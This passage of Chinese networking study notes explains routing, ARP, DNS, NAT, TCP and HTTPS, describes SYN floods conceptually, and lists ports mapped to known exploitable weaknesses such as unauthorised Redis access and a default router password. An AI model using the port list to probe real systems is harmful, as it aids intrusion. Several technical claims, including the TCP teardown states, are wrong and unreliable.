4. Hot Standby Router Protocol (HSRP)：HSRP是一种冗余路由协议，用于提供默认网关冗余。它允许多个路由器在故障时自动接管对外通信。
5. Virtual Router Redundancy Protocol (VRRP)：VRRP是类似于HSRP的协议，用于实现默认网关的冗余性。它允许多个路由器组成一个虚拟路由器并提供冗余。
6. Spanning-Tree Protocol (STP)：STP用于在具有冗余连接的网络中防止环路，并提供冗余路径的备份。它选择最佳路径并禁用其他路径，以确保网络拓扑的稳定性。
7. Power over Ethernet (PoE)：PoE是一种协议标准，它允许通过以太网电缆为网络设备提供电力供应。它使得无线接入点、IP电话、摄像头等设备可以通过网络线缆同时传输数据和电力。
# 这些协议在分布层中起着关键的作用，帮助实现数据的传输、路由选择、冗余性和网络稳定性等功能。
```

### 00x01 ARP 协议工作原理

```shell
# ARP（Address Resolution Protocol，地址解析协议）是在网络通信中用于将 IP 地址解析为物理硬件地址（MAC 地址）的协议
# 允许将网络层的 IP 地址映射到链路层的物理地址，以便在局域网络内正确地传递数据包
以下是 ARP 协议的工作原理：
1- 确定目标 IP 地址：
在发送方主机上，当需要发送数据包给具体目标主机时，首先需知道目标主机 IP 地址
2- 查找本地 ARP 高速缓存：
发送方主机首先检查本地 ARP 高速缓存（ARP Cache），其中存储最近与其他主机通信所使用 IP 地址与对应 MAC 地址映射表。若缓存中已存在所需目标 IP 地址的映射，则跳至步骤5
3- 广播 ARP 请求：
若本地 ARP 缓存中无所需 IP 地址映射，发送方主机将广播 ARP 请求消息到局域网中的所有主机。该请求包含发送方 IP 地址和 MAC 地址，并指示需解析目标 IP 地址
4- 接收 ARP 请求的主机响应：
收到 ARP 请求的主机检查请求中的目标 IP 地址是否与自身 IP 地址匹配。若匹配则创建 ARP 响应消息，包含自身 IP 地址和 MAC 地址，并将其发送给发送方主机
5- 更新 ARP 缓存：
发送方主机将接收到 ARP 响应消息中 IP 地址和 MAC 地址添加到本地 ARP 缓存中供以后通信使用
6- 发送数据包：
发送方主机知道目标主机 MAC 地址（ARP 响应获得），将使用目标 IP 地址和目标 MAC 地址构建数据包，并将其发送到局域网上
# 总结起来，ARP 协议工作原理可归纳为：通过 ARP 请求与响应交换过程，主机能解析目标 IP 地址并获取其对应 MAC 地址，从而实现在局域网上正确发送数据包的功能
```

### 00x02 RARP 协议工作原理

```shell
# RARP（Reverse Address Resolution Protocol，逆地址解析协议）与 ARP 相反的协议，用于将物理硬件地址（MAC 地址）解析为 IP 地址
# RARP 协议在启动时，用于在无配置 IP 地址情况下，从网络中获取主机 IP 地址
以下是RARP协议的工作原理：
1. 启动过程：
当主机启动时，若无配置 IP 地址，会发送 RARP 请求消息获取自己 IP 地址。通常发生在无用户干预情况下，如磁盘 less 工作站（diskless workstation）启动时
2. 广播 RARP 请求：
发送 RARP 请求的主机会广播 RARP 请求消息到网络上的所有主机，请求消息包含发送方主机的物理地址（MAC 地址）
3. 接收 RARP 请求并响应：
网络中服务器或路由器等设备接收到 RARP 请求消息搜索其配置 RARP 服务。若找到匹配请求中 MAC 地址 IP 地址映射，则该设备发送 RARP 响应消息，包含对应 IP 地址
4. 更新本地 RARP 缓存：
接收方主机收到 RARP 响应后，将更新其本地 RARP 缓存，将收到 MAC 地址与 IP 地址进行关联
5. 分配 IP 地址：
发送方主机收到 RARP 响应后，使用响应中获取到的 IP 地址进行配置，并将其分配给自身。主机可使用新获得的 IP 地址进行网络通信
# 需注意，RARP 协议在现代网络中已不再广泛使用，因 DHCP（Dynamic Host Configuration Protocol，动态主机配置协议）已取代RARP，在启动时为主机分配 IP 地址。了解 RARP 工作原理仍有助于理解网络协议的演变和网络通信的基本概念
```

### 00x03 RIP 协议工作原理

```shell
# RIP（Routing Information Protocol，路由信息协议）基于距离向量的内部网关协议（IGP），用于在较小规模网络中路由选择，通过交换路由信息维护网络拓扑
下面是 RIP 协议的工作原理：
1- 邻居发现：
发送 RIP 请求报文发现直接邻居路由器。RIP 请求报文使用 RIP 特殊的多播地址（224.0.0.9）发送，目的是寻找相邻的路由器
2- 路由信息交换：
发现相邻的路由器，开始交换路由信息。路由器在各自路由表中维护所有已知网络和距离的列表。路由器定期以 RIP 响应报文形式将各自路由表发送给相邻路由器
3- 更新路由表：
当接收到 RIP 响应报文时，路由器会根据收到的信息更新各自路由表。各路由表项包含目标网络的 IP 地址、下一跳路由器和距离（即到达目标网络的跳数）
4- 距离判断和更新：
收到的路由信息中包含到达目标网络的距离值。路由器比较收到的距离值与各自当前路由表中的距离值，基于距离值决定是否更新路由表。若收到距离值较小说明有更优路径可达目标网络则更新路由表中对应路由项
5- 触发更新和定期更新：触发更新和定期更新
	5.1- 触发更新指当网络拓扑发生变化时，如某个接口断开连接或新网络加入时，会立即发送更新消息通知相邻路由器
	5.2- 定期更新指每隔一定时间，路由器会发送完整路由表给相邻路由器，以确保路由信息的有效性
6- 路由循环避免：
RIP 协议使用跳数（hop count）作为距离衡量的标准，存在路由循环的风险。为避免路由循环，RIP 协议设置最大跳数限制（通常为15），当距离超过限制时将不再接受路径
# 总结起来，RIP 协议的工作原理是通过邻居发现、路由信息交换、更新路由表、距离判断和更新、触发更新和定期更新等过程实现路由选择和网络拓扑维护的功能
```

### 00x04 OSPF 协议工作原理

```shell
# OSPF（Open Shortest Path First，开放最短路径优先）用于内部网关协议（IGP），被广泛用于大型企业网络中，为路由器选择最优路径以在网络中转发数据包
以下是 OSPF 协议的工作原理：
1- 邻居发现：
当 OSPF 路由器启动时，通过发送 Hello 消息探测其他 OSPF 路由器，包含 ID 和其他相关信息。若两个路由器能彼此检测到对方并交换正确参数，就成为邻居
2- 路由器 ID 选择：
每个 OSPF 路由器会选择唯一路由器 ID（Router ID）。ID 可手动配置 IP 地址，可根据优先级和 IP 地址自动选择
3- 链路状态数据库（LSDB）的建立：
邻居关系建立后，OSPF 路由器交换链路状态更新（Link State Update）消息，包含本路由器网络拓扑信息。各路由器使用收到的链路状态信息构建并维护链路状态数据库（LSDB），包含整个 OSPF 域的网络拓扑信息
4- 链路状态广播：
OSPF 路由器定期广播链路状态通告（Link State Advertisement，LSA）消息，以向邻居路由器通知本路由器所了解到的网络拓扑信息。这些消息会被其他 OSPF 路由器接收并更新本地的链路状态数据库
5- 最短路径计算：
使用 Dijkstra 算法，OSPF 路由器根据链路状态数据库中的信息，计算出到达目标网络的最短路径。考虑链路的带宽、延迟等因素来选择最佳路径
6- 路由表更新：
各 OSPF 路由器根据最短路径计算的结果，生成并维护自己的路由表。路由表包含到达各目标网络的最优路径和下一跳路由器
7- 路由更新的传播：
若有路由发生变化，OSPF 路由器会生成路由更新消息，并将其传播给邻居路由器。网络中的所有路由器都能及时了解到网络拓扑的变化，并相应更新各自路由表
# 通过以上步骤，OSPF 协议能够构建一个动态的路由网络，路由器之间通过相互交换链路状态信息并计算最短路径，实现高效的数据包转发
```

### 00x05 DNS 协议工作原理

```shell
# DNS（Domain Name System，域名系统）用于将域名解析为 IP 地址的协议。允许用户通过域名访问互联网资源，而不需记住 IP 地址
以下是 DNS 协议的工作原理：
1- 用户发起域名查询：
当用户在浏览器中输入 URL（如www.example.com）时，系统会向本地 DNS 解析器发出域名查询请求
2- 本地 DNS 解析器查找本地缓存：
本地 DNS 解析器检查本地缓存中是否存在该域名与 IP 地址的映射。若存在则直接返回映射 IP 地址，并跳至步骤6
3- 本地 DNS 解析器查询根域名服务器：
若本地缓存中不存在域名与 IP 地址映射，本地 DNS 解析器将向根域名服务器发送请求。根域名服务器负责管理顶级域名服务器（如 .com、.net、.org 等）IP 地址
4- 根域名服务器提供顶级域名服务器 IP 地址：
根域名服务器收到请求后，会返回顶级域名服务器 IP 地址给本地 DNS 解析器
5- 本地 DNS 解析器查询顶级域名服务器：
本地 DNS 解析器将向顶级域名服务器发送请求，请求该域名的权威域名服务器（该域名的注册商所提供的 DNS 服务器）的 IP 地址
6- 权威域名服务器提供目标主机的 IP 地址：
顶级域名服务器接收到请求后，返回目标主机所属的权威域名服务器的 IP 地址
7. 本地 DNS 解析器查询权威域名服务器：
本地 DNS 解析器向权威域名服务器发送请求，请求该域名所对应的 IP 地址
8- 权威域名服务器返回目标主机的 IP 地址：
权威域名服务器接收到请求后，将域名所对应的 IP 地址返回给本地 DNS 解析器
9- 本地 DNS 解析器更新本地缓存：
本地 DNS 解析器将获取的域名与 IP 地址的映射关系保存到本地缓存中，以便下次查询使用
10- 本地 DNS 解析器返回 IP 地址给用户：
最后，本地 DNS 解析器将解析得到的 IP 地址返回给用户的应用程序，使其能够与目标主机建立连接并获取所需资源
# 总结起来，DNS协议的工作原理可以概括为：通过多级的域名服务器层次结构，将用户发起的域名查询传递到权威域名服务器，并返回目标主机的IP地址，以实现域名与IP地址之间的映射，从而实现用户通过域名访问互联网资源的功能。
```

### 00x06 NAT (网络地址转换) 协议工作原理

```shell
# NAT（Network Address Translation，网络地址转换）一种在互联网连接中常用技术，用于将私有 IP 地址转为公共 IP 地址，以便私有网络和公共网络间通信
NAT 协议的工作原理如下：
1. 私有网络中的设备（如计算机、路由器等）使用私有IP地址（通常是在以下IP地址段中：10.0.0.0 - 10.255.255.255，172.16.0.0 - 172.31.255.255，192.168.0.0 - 192.168.255.255），这些IP地址在公共互联网中是无法直接访问的。
2. 当私有网络中的设备要与互联网上的设备进行通信时，数据包首先发送到网络中的NAT设备（通常是路由器）。
3. NAT设备检查数据包的源IP地址和目的IP地址。
4. 如果源IP地址是私有IP地址，NAT设备将替换数据包的源IP地址为公共IP地址（从NAT设备的公共IP地址池中获取一个可用的公共IP地址）。
5. NAT设备还会将源端口和目的端口进行转换，以保持数据包的连通性。
6. NAT设备将修改后的数据包发送到公共互联网上的目标设备。
7. 公共互联网上的目标设备响应数据包时，数据包首先发送到NAT设备。
8. NAT设备查找与目标设备之前建立的连接信息，将数据包转发回私有网络中的设备，恢复源IP地址、目标IP地址和端口号。
9. 私有网络中的设备接收到数据包后，进行相应的处理。
# 通过 NAT 协议，多个设备可共享一个公共 IP 地址，避免 IPv4 地址短缺问题，并增加网络安全性，因私有网络中设备不直接暴露在公共互联网上。NAT 还可提供端口转换功能，使得多个内部设备可使用同一个公共 IP 地址与公共网络通信
```

### 00x07 三次握手四次挥手

```shell
# "三次握手"和"四次挥手" TCP（Transmission Control Protocol，传输控制协议）用于建立和关闭连接过程。
# TCP 协议中重要的握手和挥手机制，确保数据可靠传输
1. 在建立 TCP 连接时，需三次握手（Three-way Handshake）：
第一步：客户端向服务器发送一个带 SYN（同步序列编号）标志的请求报文段，表示客户端打算建立连接。客户端进入 SYN-SENT 状态
第二步：服务器收到请求后，向客户端发送一个带 SYN/ACK（同步/确认序列编号）标志的应答报文段。表示服务器接受客户端请求，并产生一个新的序列号。服务器进入 SYN-RECEIVED 状态
第三步：客户端收到服务器应答后，向服务器发送一个带 ACK 标志的报文段，表示客户端确认收到服务器应答。双方进入正常 ESTABLISHED 状态，可开始传输数据
# 通过三次握手，TCP 连接建立成功
2. 在关闭 TCP 连接时，需四次挥手（Four-way Handshake）：
第一步：当一方（客户端或服务器）决定关闭连接时，发送一个带 FIN（结束）标志的报文段，表示该方已无数据要发送，但仍可接收数据。发送方进入 FIN-WAIT-1 状态
第二步：接收到关闭请求后，另一方向发送方发送一个 ACK 确认报文段，表示收到关闭请求。接收方进入 CLOSE-WAIT 状态
第三步：接收方继续发送完所有数据后，向发送方发送一个带 FIN 标志的报文段，表示同样希望关闭连接。发送方进入 LAST-ACK 状态
第四步：发送方收到关闭请求后，发送一个 ACK 报文段以确认，并进入 TIME-WAIT 状态。接收方收到 ACK 后进入 CLOSED 状态。发送方在等待一个时间间隔（等待可能存在的延迟报文）后，关闭连接，进入 CLOSED 状态
# 通过四次挥手，TCP 连接顺利关闭
# 三次握手和四次挥手的目的是确保连接的可靠建立和关闭，同时保证双方都能正确地进行数据的传输和接收
```

### 00x08 TCP 如何保证可靠传输

```shell
# TCP（Transmission Control Protocol，传输控制协议）通过以下方式保证可靠传输：
1. 序列号与确认机制：TCP 将每个传输数据包进行编号，接收端会发送确认消息确认已收到的数据包，发送端根据确认消息进行重传或发送下一个数据包。序列号与确认机制确保数据有序性和完整性
2. 数据校验和：TCP 在每个数据包中添加校验和，检测在传输过程中是否出现数据损坏。接收端通过校验和验证数据的正确性，出现损坏则会请求重新传输
3. 超时重传：TCP 设置一个定时器监测数据包发送情况，在设定时间内未收到对应确认消息，发送端会认为数据包丢失，并重新发送该数据包。超时重传机制确保数据可靠性
4. 流量控制：TCP 使用滑动窗口机制进行流量控制。接收端可以通知发送端可以接收的最大数据量，发送端根据接收端的通知进行发送，以避免数据的溢出和丢失。
5. 拥塞控制：TCP 使用拥塞控制算法来避免网络中的拥塞情况。TCP会根据网络的拥塞程度调整发送速率，当网络出现拥塞时会减少发送速率以避免造成更严重的拥塞。
6. 连接建立与终止：TCP 建立连接和终止连接时使用三次握手和四次挥手的机制，确保双方都准备好进行数据传输。
# 通过以上机制，TCP 实现可靠的数据传输，保证数据完整性、有序性和及时性
```

### 00x09 TCP 为何要三次握手

```shell
# TCP（Transmission Control Protocol，传输控制协议）建立可靠连接时使用三次握手过程
# 目的是确保通信双方数据传输能正常进行，避免无效连接请求
TCP 要三次握手的原因：
1. 确保双方都愿意建立连接：第一次握手由客户端发起，服务器接收到请求后，通过回复确认表示自己愿意建立连接。可确保服务器正常运行且愿意处理客户端请求
2. 确保双方初始序列号（Initial Sequence Number，ISN）同步：第二次握手由服务器发起，服务器发送 ISN 给客户端，确认客户端请求。客户端接收到服务器确认后发送确认，且通过响应中 ISN 确认服务器 ISN。可确保双方使用相同初始序列号，用于后续数据通信顺序和可靠性
3. 防止已失效连接请求被接受：第三次握手由客户端发起，客户端确认自己对服务器响应已收到。服务器接收到客户端确认后也确认客户端请求。可防止已失效连接请求被服务器接收，避免浪费服务器资源
# 通过三次握手，TCP 协议可建立可靠连接，双方都确认彼此状态和 ISN，以确保后续数据传输能可靠进行。三次握手提供一种机制避免失效连接请求被接收，增强连接可靠性
```

### 00x10 TCP/UDP 应用层协议

```shell
# TCP 和 UDP 是两种不同的传输层协议，是在网络协议栈中位于应用层之下
# TCP（Transmission Control Protocol，传输控制协议）面向连接的、可靠的协议。提供可靠数据传输、数据流控制、拥塞控制等功能，适用于对数据完整性和可靠性有较高要求的应用。在应用层中与 TCP 协议对应应用层协议有许多，其中常见的包括：
- HTTP（Hypertext Transfer Protocol，超文本传输协议）：用于 Web 浏览器和 Web 服务器间传输超文本的协议，万维网的基础协议
- FTP（File Transfer Protocol，文件传输协议）：用于客户端和服务器间传输文件的协议
- SMTP（Simple Mail Transfer Protocol，简单邮件传输协议）：用于电子邮件的传输协议，用于发送电子邮件
# UDP（User Datagram Protocol，用户数据报协议）无连接、不可靠的协议。提供面向事务的简单传输服务，适用于实时性要求较高、对可靠性要求较低的应用。在应用层中与 UDP 协议对应应用层协议有许多，其中常见的包括：
- DNS（Domain Name System，域名系统）：用于将域名解析为对应的 IP 地址的协议
- RTP（Real-time Transport Protocol，实时传输协议）：用于实时音频和视频传输
- DHCP（Dynamic Host Configuration Protocol，动态主机配置协议）：用于动态分配 IP 地址和其他网络配置参数的协议
- SNMP（Simple Network Management Protocol，简单网络管理协议）：用于网络设备的管理和监控
# 需注意，TCP 和 UDP 仅负责提供传输层的服务，应用层协议则建立在 TCP 或 UDP 之上，通过其实现应用程序间的通信
```

### 00x11 TCP 与 UDP 区别总结

```shell
# TCP（Transmission Control Protocol，传输控制协议）和 UDP（User Datagram Protocol，用户数据报协议）常见传输层协议
区别如下：
1. 连接性：
	- TCP 是一种面向连接的协议，通信前先建立连接确保可靠数据传输
	- UDP 是一种无连接的协议，通信双方直接交换数据包而无需事先建立连接
2. 可靠性：
	- TCP 提供可靠数据传输，通过数据序列号、确认应答机制、超时重传等机制确保数据正确性和完整性
	- UDP 不提供可靠性保证，数据包可能会丢失、重复或乱序
3. 效率：
	- TCP 可靠性机制需增加包头开销及维护连接状态的开销，TCP 比 UDP 更消耗计算和带宽资源。
	- UDP 因不需建立连接和维护状态，比 TCP 更高效
4. 消息边界：
	- TCP 是面向流协议，将连续的数据流划分为数据块，但不保留消息边界，因此应用层需自行定义消息开始和结束
	- UDP 是数据报协议，每个 UDP 包都是一个独立的消息，保留消息边界
5. 适用场景：
	- TCP 适用于要求可靠传输、顺序性和流量控制的应用，如网页浏览、文件传输、电子邮件等
	- UDP 适用于实时性要求较高、数据丢失可容忍的应用，如音频、视频流传输、在线游戏等
# 需注意，TCP 提供可靠数据传输，但不能保证最终应用层的数据完整性。特定情况下 UDP 可通过应用层实现可靠性机制提供可靠数据传输。选择使用 TCP 或 UDP 取决于具体应用需求和性能要求
```

### 00x12 TCP 粘包/拆包原因及解决方案

```shell
# TCP 粘包和拆包是在 TCP 传输过程中可能出现的问题。数据发送方在发送数据时 TCP 协议会将数据分成合适大小的包进行发送。而接收方处理数据时因 TCP 是流式协议，无法保证接收到数据包的大小和数量与发送方发送的一致。导致以下问题：
1. TCP 粘包：当多个小的数据包被发送方组合成一个大的数据包时，接收方可能在一次读取操作中接收到多个数据包，即粘包现象
2. TCP 拆包：当一个大的数据包被发送方拆分成多个小的数据包时，接收方可能在一次读取操作中接收到不完整的数据包，即拆包现象
# TCP 粘包和拆包发生原因是传输层的数据以字节流的形式进行传输，无明确的消息边界。使得接收方难以区分发送方发送的数据包的边界位置

# 可采用以下解决方案：
1. 消息边界标记：在数据包中添加特定标记，用于标识数据包边界。接收方根据这个标记正确拆分接收到的数据包
2. 固定长度消息：发送方将每个数据包固定为相同长度，接收方按照固定长度读取数据包，从而避免粘包和拆包问题
3. 消息长度前置：在每个数据包的开头添加表示消息长度的字段，接收方首先读取长度字段，然后根据长度读取相应字节数的数据，以确保每个消息完整接收
4. 使用应用层协议：在应用层使用特定协议进行消息的分割和重组，如 HTTP、WebSocket 等
# 解决方案可根据具体情况选择，并结合应用层需求处理 TCP 粘包和拆包问题
```

### 00x13 SYN 攻击原理

```shell
# SYN 攻击（SYN flood attack）一种网络攻击，攻击者向目标主机发送大量的 SYN 请求，导致目标主机的资源耗尽，无法正常工作
# SYN 攻击的原理如下：
1. 攻击者向目标主机发送大量的 SYN 请求
2. 目标主机收到 SYN 请求后，会向攻击者发送 SYN-ACK 确认报文
3. 攻击者收到 SYN-ACK 确认报文后，不会发送 ACK 确认报文
4. 目标主机等待 ACK 确认报文超时，会重发 SYN-ACK 确认报文
5. 攻击者继续不发送 ACK 确认报文
6. 目标主机重复发送 SYN-ACK 确认报文，直到资源耗尽

# SYN 攻击的危害如下：
1. 导致目标主机的资源耗尽，无法正常工作
2. 影响目标主机的正常通信
3. 导致目标主机的服务不可用

# SYN 攻击的防范措施如下：
1. 使用防火墙过滤 SYN 请求
2. 使用 SYN Cookies 防范 SYN 攻击
3. 使用 TCP 连接缓冲区管理技术防范 SYN 攻击
4. 使用 SYN 洪水检测技术防范 SYN 攻击
5. 使用 SYN 重放检测技术防范 SYN 攻击
```

### 00x14 SYN Flood 攻击原理

```shell
# SYN Flood 是一种网络攻击，攻击者向目标主机发送大量的 SYN 请求，导致目标主机的资源耗尽，无法正常工作
# SYN Flood 攻击的原理如下：
1. 攻击者向目标主机发送大量的 SYN 请求
2. 目标主机收到 SYN 请求后，会为每个 SYN 请求创建一个新的 TCP 连接
3. 当目标主机的 TCP 连接数达到最大值时，会停止创建新的 TCP 连接
4. 攻击者继续向目标主机发送 SYN 请求，导致目标主机的 TCP 连接数超过最大值
5. 目标主机无法创建新的 TCP 连接，无法处理正常的网络流量

# SYN Flood 攻击的防御方法如下：
1. 使用防火墙过滤 SYN 请求
2. 使用 TCP 连接缓冲区来缓冲 SYN 请求
3. 使用 SYN Cookies 来防止 SYN 请求的重放
```

## 0x00x028 端口

```shell
# web 网站
	80 web http
	80-89 web
	8000-9090 web
	8080 web tomcat
# 数据库
	1433 MSSQL
	1443 SQL
	1521 Oracle
	3306 MySQL
	5432 PostgreSQL
	50000 DB2
# 特殊服务类
	139,445 Samba
	389,639 LDAP
	443 SSL 心脏滴血 https
	445 ms08067/ms11058/ms17010等
	873 Rsync未授权
	1099 RMI
	5984 CouchDB http://xxx:5984/_utils/
	6379 Redis 未授权
	7001,7002 WebLogic 默认弱口令、反序列
	8080,8443 Jenkins
	9200,9300 Elasticsearch 参考 WooYun: 多玩某服务器 ElasticSearch 命令执行漏洞
	11211 Memcache 未授权访问
	27017,27018 MongoDB 未授权访问
	50000 SAP 命令执行
	50070,50030 hadoop 默认端口未授权访问
# 常用端口类
	21 FTP
	22 SSH
	23 Telnet
	445 SMB 弱口令扫描
	2601,2604 zebra 路由，默认密码zebra
	3389 RDP
```

## 应用、协议、端口 附加

### 00x00 常见状态码

```shell
# 常见的状态码有以下几种：
	1- 1XX：信息性状态码，表示请求已接收，继续处理
	2- 2XX：成功状态码，表示请求已成功被接收、理解和处理
	3- 3XX：重定向状态码，要完成请求必须进一步操作
	4- 4XX：客户端错误状态码，请求包含语法错误或者无法完成请求
	5- 5XX：服务器错误状态码，服务器在处理请求的过程中发生了错误
具体而言，常见的状态码包括：
	200 OK：请求已成功，服务器成功处理客户端请求，且响应包含所期望的内容
	201：请求成功并已创建新的资源
	202：已接受请求，但未处理完毕
	300：请求的资源可在多处得到
	301 Moved Permanently：请求的资源已被永久移动到新的 URL，返回新的 location 头，客户端应使用新的 URL 进行请求
	302：临时移动，请求的资源临时被移动到新的 URL，返回新的 location 头
	303：重定向，请求的资源已找到，需使用 GET 方法重新获取
	304：内容未修改，使用缓存
	400 Bad Request：错误请求，请求无效，服务器无法理解客户端发送请求的格式
	401：未授权，请求要求进行身份验证
	403 Forbidden：禁止，服务器拒绝访问请求的资源，即客户端没有访问权限
	404 Not Found：未找到，请求的资源不存在，服务器找不到请求的资源
	500 Internal Server Error：服务器内部错误，服务器在处理请求时遇到预料不到的情况或错误，无法完成请求，是通用的服务器错误响应
	501：未实现，服务器不支持当前请求所需要的某个功能
	502 Bad Gateway：错误网关，服务器作为网关或代理服务器时，从上游服务器接收到无效的响应
	503 Service Unavailable：服务不可用，服务器暂时无法处理请求，通常是因服务器维护或负载过重不能响应
	504 Gateway Timeout：网关超时，服务器作为网关或代理服务器时，未能及时从上游服务器获取响应
```

### 00x01 一次完整 HTTP 请求过程

```shell
1- 解析 URL：客户端解析用户输入的 URL，提取出协议、主机名、端口号、路径等信息
2- 域名解析：将域名解析成可用 IP 地址和端口号。包括浏览器先查询自身 DNS 缓存，未找到会查找系统自身 DNS 缓存、hosts 文件查找，最后发起远程 DNS 解析请求
3- 建立 TCP 连接：客户端根据解析得到主机名和端口号，浏览器随机端口（1024 < 端口 < 65535）向与服务器建立 TCP 连接。默认使用 HTTP TCP 作为传输层协议
4- 发起请求：客户端向服务器发送 HTTP 请求报文，包括请求方法（GET/POST 等）、请求头（客户端和所需资源信息等）和请求体（对需发送数据的请求，如 POST）
5- 服务器处理 HTTP 请求：服务器接收到 HTTP 请求报文后，根据请求的 URL 和方法进行相应的处理，可能涉及数据查询、业务逻辑处理等。
6- 服务器返回响应：服务器生成 HTTP 响应报文，包括响应状态码（请求成功/失败的代码）、响应头（服务器信息/响应内容类型等）和响应体（实际响应数据）
7- 响应传输：服务器将响应报文通过建立的 TCP 连接发给客户端
8- 客户端接收响应：客户端接收到服务器发送的 HTTP 响应报文
9- 客户端处理响应，解析 HTML：客户端收到响应后，根据响应报文中的状态码和响应头进行处理。客户端会解析响应体的数据，并加载其中的静态资源，如js、css、图片等
10- 客户端渲染展示内容：当所需资源都加载完成后，客户端就会开始渲染页面，并将内容展示给用户
11- 关闭 TCP 连接：根据 HTTP 版本和服务器设置，TCP 连接可能会通过持久连接（Keep-Alive）保持活动状态以便后续请求复用，或在请求/响应后关闭

# HTTP/1.1 中引入持久连接（HTTP keep-alive），可以让TCP连接保持活跃状态，方便后续的请求
# 以上过程描述一次简化 HTTP 请求过程。实际可能涉及一些其他细节和步骤，如重定向、缓存处理等
```

### 00x02 HTTP 长连接和短连接的区别

```shell
# 在 HTTP 协议中，长连接（Keep-Alive）和短连接是两种不同的连接方式，区别在于连接持续时间和是否需要频繁建立/断开连接
	1- 短连接：在短连接方式下，每次客户端和服务器之间请求/响应完成后，连接会立即关闭。即每个请求都需建立一个新连接，服务器发送响应后立即关闭连接，不保持连接状态。这种方式对服务器资源消耗较小，但在频繁请求的情况下，建立和关闭连接的开销会增加
	2- 长连接：在长连接方式下，客户端和服务器之间的连接会被保持活跃，不会立即关闭。客户端/服务器可在同一连接上发送多个请求/响应。连接持续时间可由服务器或客户端控制，允许更多请求和响应通过同一连接完成。这种方式可减少频繁连接的开销，提高通信效率，但同时也会占用服务器资源较长时间
	3- 短连接适合小规模请求和响应，对服务器资源要求较低。长连接适合大规模、频繁的请求和响应，提高通信效率，但需考虑服务器资源的管理和控制。
	4- 无论长短连接客户端消耗的资源一样，Web 应用中，多数情况下都采用长连接方式提高性能和用户体验
	5- 由于 HTTP 协议的请求-响应模型特性，长连接并不能减少报文的传输量，只是减少 TCP 建立和关闭消耗。在频繁请求同一资源情况下，使用短连接更能减少资源消耗
```

### 00x03 什么是 SSL

```shell
# SSL（Secure Sockets Layer），安全套接层，一种用于保护网络通信安全的加密协议，SSL 最初由 Netscape 公司开发，后由其演进为 TLS（Transport Layer Security）协议，用于两个应用程序间提供加密和身份验证，确保数据在传输过程中的机密性和完整性，为网站和应用程序提供加密和身份验证等方面的保障。
	1- 加密：SSL 使用对称和非对称加密的组合来加密传输数据。对称加密使用相同密钥对数据进行加解密，非对称加密（公钥加密）使用一对密钥，公钥加密数据，私钥解密数据。SSL 使用这两种加密方式相结合的方式保证数据的机密性
	2- 身份验证：SSL 使用数字证书来验证通信双方身份。证书由受信任的证书颁发机构（CA）颁发，包含服务器的公钥和其他相关信息。客户端在连接服务器时，会验证服务器的证书，确保通信的对方是合法的、可信的服务器
	3- 完整性保护：SSL 使用消息摘要算法（如SHA）来对传输的数据进行哈希计算，生成消息摘要。接收方可使用相同算法对接收到的数据进行计算，比较生成的摘要值，以验证数据在传输过程中是否被篡改
# 通过这些安全机制，SSL 可保护网络通信中的敏感数据，如用户名、密码、信用卡号等，免受窃听、篡改和伪装等攻击。SSL 广泛应用于诸如网上银行、电子商务、电子邮件、文件传输等需要保护数据安全的通信场景
```

### 00x04 HTTPS 握手过程中用到哪些技术

```shell
1- 密钥交换 非对称加密（加密公钥）
2- 对称加密（加密数据）
3- 预共享密钥（PSK）
4- 身份验证（数字证书）
5- 握手协议（SSL/TLS）
6- 加密套接字层（SSL）版本协商
```

### 00x05 HTTPS 如何保证数据传输安全性

```shell
# HTTPS 是如何保证数据传输的安全（SSL/TLS 是怎么工作保证安全的）
1- 握手过程：在建立 HTTPS 连接前，客户端和服务器之间进行 SSL/TLS握手过程。步骤如下：
   1.1- 客户端发起握手请求：客户端向服务器发送一个握手请求，请求建立安全连接
   1.2- 服务器响应握手请求：服务器接收到客户端的握手请求后，向客户端发送包含证书的响应。证书包含服务器的公钥、服务器的身份信息及由证书颁发机构（CA）签名
   1.3- 客户端验证证书：客户端收到服务器的证书后，会验证证书的有效性。包括检查证书的有效期、验证证书签名是否可信及验证服务器的身份信息
   1.4- 客户端生成密钥：证书验证通过，客户端会生成随机对称密钥（称为会话密钥或对称密钥），用于后续数据加解密
   1.5- 密钥交换：客户端用服务器的公钥加密生成的对称密钥，并发送给服务器
   1.6- 会话密钥建立：服务器用自己的私钥对收到的加密的会话密钥进行解密，以获取对称密钥。客户端和服务器都持有相同的会话密钥，用于加解密传输的数据
2- 数据传输加密：建立安全连接后，客户端和服务器间的数据传输使用对称密钥加密。客户端使用对称密钥加密要发送的数据，服务器使用对称密钥解密接收到的数据
3- 数据完整性验证：除加密外，SSL/TLS 还使用哈希算法验证数据完整性。在传输过程中，数据进行哈希处理并附加消息摘要（MAC），接收方在接收到数据后重新计算哈希值，并与发送方传递的摘要比对。摘要不匹配表示数据被篡改，连接可能被中断
```

### 00x06 HTTP 和 HTTPS 区别

```shell
# HTTP（Hypertext Transfer Protocol）和 HTTPS（Hypertext Transfer Protocol Secure）用于在客户端和服务器间传输数据的协议，主要区别在于安全性
	1- 安全性：
		- HTTP 是一种明文、不安全的协议，数据在传输过程中以明文形式发送、未加密，容易被非法窃听、获取和篡改。
		- HTTPS 是 HTTP 加上 SSL（Secure Sockets Layer）或 TLS（Transport Layer Security）组合形成的加密协议，对传输的数据进行加密和验证，确保数据机密性和完整性，提高数据数据传输安全性
	2- 端口号：
		- 不同的连接方式，HTTP 使用 80 端口，HTTPS 使用 443 端口
		- 建立 HTTPS 连接时，需进行 SSL/TLS 握手过程，涉及加、解密操作，需使用不同默认端口
	3- 证书/费用：
		- HTTP 无需证书验证身份，易受伪装和中间人攻击
		- 为建立 HTTPS 连接，服务器需使用数字证书验证其身份。证书由受信任的第三方机构（证书颁发机构 CA）颁发，用于验证服务器真实性
		- HTTPS 需要购买 SSL 证书，一般需要一定费用，HTTP 则无
	4- 加密：
		- HTTP 不提供加密功能，数据以明文形式传输
		- HTTPS 使用公开密钥加密（Public Key Encryption）加密传输数据，传输过程中数据被加密并在接收方解密，确保数据传输过程中的保密性
	5- 响应速度：
		- 理论上，HTTP 响应速度更快，HTTP 只需三次握手， 3 个包即可建立连接，而 HTTPS 除了三次握手，还需进行 SSL 握手，一共需 12 个包
	6- 消耗资源：
		- HTTPS 是构建在 SSL 之上的 HTTP 协议，HTTPS 会消耗更多服务器资源
	7- 展示方式：
		- 当浏览器访问 HTTPS 网站时，地址栏会显示小锁的图标，表示连接是安全的。而 HTTP 则无
```

### 00x07 URI 和 URL 的区别

```shell
# URI（Uniform Resource Identifier）和 URL（Uniform Resource Locator）是用于标识和定位资源的标识符，实际使用中这两个术语常互换使用
